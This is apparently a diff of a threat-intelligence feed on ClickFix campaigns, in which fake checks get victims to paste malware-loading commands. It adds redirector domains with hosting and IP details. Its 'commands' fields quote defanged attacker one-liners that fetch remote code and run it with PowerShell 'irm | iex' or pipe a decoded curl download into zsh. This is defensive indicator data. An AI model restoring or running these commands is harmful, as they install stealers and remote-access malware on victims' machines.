@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4980,
+ "count": 4982,
  "indicators": [
   {
    "indicator": "1.15.58.123",
@@ -19571,13 +19571,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
+    "t-trustresnew.com",
     "xorados.com",
     "trek-72.com",
-    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -69584,8 +69584,8 @@
    "connects_to": [
     "xorados.com",
     "trek-72.com",
-    "t-trustrest.com",
     "t-trustresnew.com",
+    "t-trustrest.com",
     "trustchecknes.com",
     "groverudder12.com"
    ],
@@ -74294,6 +74294,70 @@
     "dns-api.org"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "devandry.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-01",
+   "last_seen": "2026-11-01",
+   "last_online": "2026-11-11",
+   "offline_since": null,
+   "url": "https://devandry.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "2a02:4780:42:9875:7210:7d9c:d018:d950",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger International Limited, CY",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "2a02:4780:42:9875:7210:7d9c:d018:d950",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
+    },
+    {
+     "ip": "2a02:4780:84:b9f5:615b:8e77:4438:4bcf",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "devandry.com",
+     "status": "online",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc",
+    "xorados.com",
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "dexterseolab.com",
@@ -79951,8 +80015,8 @@
    "lure_from": [
     "verifyidentrob01.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -80111,8 +80175,9 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -84044,8 +84109,9 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -84302,8 +84368,9 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -105090,6 +105157,68 @@
     "pizdalisibivet.org",
     "yaponovosh.org",
     "nikogdatakonebilo.cc"
+   ]
+  },
+  {
+   "indicator": "georgiaonline.ge",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-01",
+   "last_seen": "2026-11-11",
+   "last_online": "2026-11-11",
+   "offline_since": null,
+   "url": "https://georgiaonline.ge/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "89.116.190.253",
+   "asn": "AS47583",
+   "org": "Hostinger International Limited",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "89.116.190.253",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-11"
+    },
+    {
+     "ip": "2a02:4780:b:1309:0:2295:e1e6:6",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "georgiaonline.ge",
+     "status": "online",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-11"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex"
+   ],
+   "connects_to": [
+    "lepafonso.bz",
+    "t-trustresnew.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
+   ],
+   "lure_from": [
+    "interseq.at"
    ]
   },
   {
@@ -241935,7 +242064,9 @@
     "ncheck-brows.beer",
     "id-verfied.boats"
    ],
-   "lure_from": []
+   "lure_from": [
+    "browse-nnccodes.beer"
+   ]
   },
   {
    "indicator": "tplroofingandconstructionllc.com",
